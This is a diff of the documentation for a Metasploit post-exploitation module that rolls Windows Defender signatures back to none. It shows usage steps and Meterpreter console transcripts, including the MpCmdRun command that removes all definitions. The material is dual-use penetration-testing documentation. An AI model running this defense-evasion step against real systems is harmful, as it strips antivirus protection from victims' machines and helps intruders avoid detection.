@@ -1,81 +1,122 @@
-
+## Vulnerable Application
+### Overview
 This module requires system privs
 
-This module rolls back the signatures in windows defender to the
-earliest signatures.  The level of protection is somewhat indeterminate.
+This module rolls back the signatures in Windows Defender to the
+earliest signatures. The level of protection is somewhat indeterminate.
 This action is accomplished by running the command:
 `MpCmdRun.exe -RemoveDefinitions -All`
 
-To recover, you can run
-`MpCmdRun.exe -UpdateSignatures`
-That will force defender to update the signatures to the latest version
-from 
+To recover, you can run `MpCmdRun.exe -UpdateSignatures`.
+That will force Windows Defender to update the signatures
+to the latest version available from Microsoft.
 
+## Verification Steps
+1. Get a Meterpreter session as the `NT AUTHORITY\SYSTEM` user.
+1. `use post/windows/manage/rollback_defender_signatures`
+1. `set SESSION <ID of Meterpreter session>`
+1. Optionally set the ACTION to run with `set ACTION <action to run>`
+1. `run`
 
-###Vulnerable Applications
-Windows defender is the target, though this is a feature
+## Options
+### ACTION
+#### ROLLBACK
+Rolls the Windows Defender signature definitions back to the earliest available signatures.
 
-###Verification Steps
+### UPDATE
+Updates the Windows Defender signature definitions to the latest versions available from Microsoft.
+
+## Scenarios
+### ROLLBACK Action on Windows Server 2022
 ```
-msf5 post(windows/manage/rollback_defender_signatures) > sessions -i -1
-[*] Starting interaction with 3...
+msf6 > sessions
 
-meterpreter > sysinfo
-Computer        : WIN-5ADJK2NT7IJ
-OS              : Windows 7 (Build 7600).
-Architecture    : x64
-System Language : en_US
-Domain          : WORKGROUP
-Logged On Users : 2
-Meterpreter     : x64/windows
-meterpreter > getuid
-Server username: NT AUTHORITY\SYSTEM
-meterpreter > background
-[*] Backgrounding session 3...
-msf5 post(windows/manage/rollback_defender_signatures) > show options
+Active sessions
+===============
+
+  Id  Name  Type                     Information                            Connection
+  --  ----  ----                     -----------                            ----------
+  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ WIN-BR0CCBA815B  172.28.94.235:45437 -> 172.28.82.203:4444 (172.28
+                                                                            .82.203)
+
+msf6 > use post/windows/manage/rollback_defender_signatures 
+msf6 post(windows/manage/rollback_defender_signatures) > set SESSION 1 
+SESSION => 1
+msf6 post(windows/manage/rollback_defender_signatures) > show options
 
 Module options (post/windows/manage/rollback_defender_signatures):
 
    Name     Current Setting  Required  Description
    ----     ---------------  --------  -----------
-   ACTION   Update           yes       Action to perform (Update/Rollback) (Accepted: Rollback, Update)
-   SESSION  3                yes       The session to run this module on.
+   SESSION  1                yes       The session to run this module on
 
-msf5 post(windows/manage/rollback_defender_signatures) > set action rollback
-action => rollback
-msf5 post(windows/manage/rollback_defender_signatures) > set verbose true
-verbose => true
-msf5 post(windows/manage/rollback_defender_signatures) > show options
 
-Module options (post/windows/manage/rollback_defender_signatures):
+Post action:
 
-   Name     Current Setting  Required  Description
-   ----     ---------------  --------  -----------
-   ACTION   rollback         yes       Action to perform (Update/Rollback) (Accepted: rollback, update)
-   SESSION  3                yes       The session to run this module on.
+   Name      Description
+   ----      -----------
+   ROLLBACK  Rollback Defender signatures
 
-msf5 post(windows/manage/rollback_defender_signatures) > run
 
-[*] program_path = C:\Program Files
-[*] file_path = C:\Program Files\Windows Defender\MpCmdRun.exe
-[*] Removing All Definitions for Windows Defender
-[*] rollback
+msf6 post(windows/manage/rollback_defender_signatures) > run
+
+[*] Removing all definitions for Windows Defender
 [*] Running cmd.exe /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
 [*] 
-Service Version: 6.1.7600.16385
-Engine Version: 1.1.15400.5
-AntiSpyware Signature Version: 1.281.1013.0e[*] Post module execution completed
+Service Version: 4.18.2207.7
+Engine Version: 1.1.19600.3
+AntiSpyware Signature Version: 1.375.652.0
+AntiVirus Signature Version: 1.375.652.0
 
-### Options
+Starting engine and signature rollback to none...
+Done!
+[*] Post module execution completed
+msf6 post(windows/manage/rollback_defender_signatures) > 
+```
+
+## UPDATE Action on Windows Server 2022
+```
+msf6 > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                            Connection
+  --  ----  ----                     -----------                            ----------
+  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ WIN-BR0CCBA815B  172.28.94.235:45437 -> 172.28.82.203:4444 (172.28
+                                                                            .82.203)
+
+msf6 > use post/windows/manage/rollback_defender_signatures 
+msf6 post(windows/manage/rollback_defender_signatures) > set SESSION 1 
+SESSION => 1
+msf6 post(windows/manage/rollback_defender_signatures) > set ACTION UPDATE 
+ACTION => UPDATE
+msf6 post(windows/manage/rollback_defender_signatures) > show options
+
 Module options (post/windows/manage/rollback_defender_signatures):
 
    Name     Current Setting  Required  Description
    ----     ---------------  --------  -----------
-   ACTION   rollback         yes       Action to perform (Update/Rollback) (Accepted: rollback, update)
-   SESSION  3                yes       The session to run this module on.
+   SESSION  1                yes       The session to run this module on
 
-Session is standard
-ACTION is what you would like to do.  Rollback rolls the definitions
-back to the original, update updates the signatures.  In theory, on
-a normal system, rollback will push to old definitions, and update will
-return the definitions.
+
+Post action:
+
+   Name    Description
+   ----    -----------
+   UPDATE  Update Defender signatures
+
+
+msf6 post(windows/manage/rollback_defender_signatures) > run
+
+[*] Updating definitions for Windows Defender
+[*] Running cmd.exe /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -SignatureUpdate
+[*] Signature update started . . .
+Service Version: 4.18.2207.7
+Engine Version: 1.1.19600.3
+AntiSpyware Signature Version: 1.375.652.0
+AntiVirus Signature Version: 1.375.652.0
+Signature update finished. No updates needed
+[*] Post module execution completed
+msf6 post(windows/manage/rollback_defender_signatures) > 
+```
